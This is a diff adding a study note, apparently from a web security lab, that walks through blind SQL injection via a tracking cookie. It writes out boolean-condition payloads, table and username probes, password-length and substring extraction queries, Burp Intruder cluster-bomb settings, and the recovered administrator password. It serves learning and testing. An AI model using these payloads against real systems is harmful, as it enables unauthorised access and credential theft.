@@ -1,0 +1,80 @@
+Blind SQL Injection With conditional Response
+
+Vulnerable parameter - tracking cookie
+
+main goal : 
+1> find username and password of administrator user
+2> login as the administrator user
+
+Analysis:
+
+1> Confirm that the parameter is Vulnerable to blind sqli
+
+imagine query:
+select tracking_id from tracking_table where tracking_id='mkUsurYBHimnK3RK'
+
+-> if this tracking id exists -> query returns value -> welcom back message
+-> if the tracking id doesn't exist -> query returns nothing -> no welcome back message
+
+select tracking_id from tracking_table where tracking_id='mkUsurYBHimnK3RK' 
+and 1=1--'
+
+-> TRUE -> Welcome back
+
+select tracking_id from tracking_table where tracking_id='mkUsurYBHimnK3RK' 
+and 1=0--'
+
+-> FALSE -> No Welcome back 
+
+(2) Confirm That we have a users tracking_table
+
+select tracking_id from tracking_table where tracking_id='mkUsurYBHimnK3RK' 
+and (select 'x' from users LIMIT 1)='x'--'
+
+-> TRUE -> Welcome Back message -> users table exit in database
+
+(3) confirm that username administrator exists users table
+
+select tracking_id from tracking_table where tracking_id='mkUsurYBHimnK3RK' 
+and (select username from users where username='administrator')='administrator'--'
+
+-> True -> Welcome back msg -> username administrator exists
+
+(4) Enumerate the password of the administrator user
+
+finding length of password for brute force:--
+
+select tracking_id from tracking_table where tracking_id='mkUsurYBHimnK3RK' 
+and (select username from users where username='administrator' and
+LENGTH(password)>20)='administrator'--'
+
+LENGTH(password)>1
+LENGTH(password)>2
+Till we didn't find welcome back message
+
+password length : 20 character
+
+-->Now we need to loop throught all 20 character to find password:
+
+-->we need to find first character by looping from a to z , 
+and same goes for second character
+
+
+select tracking_id from tracking_table where tracking_id='mkUsurYBHimnK3RK' 
+and (select substring(password,1,1) from users where username='administrator')='a'--'
+
+1> send the request to intruder 
+2> attack type cluster bomb
+3> clear all payload markers
+4> add parameter in both place, substring(password,§1§,1) and '§a§'--
+5> now select payload set , 1> number 2> brute forcer
+6> number payload options: type sequential : from 1 , To 20 , step 1
+7> min length and max length 1 for brute forcer 
+8> start attack
+
+password result of intruder:
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+d v g q b 6 b e o 6  l   h  a  O  h  8  y  a  r  4
+
+
+dvgqb6beo6lhaOh8yar4
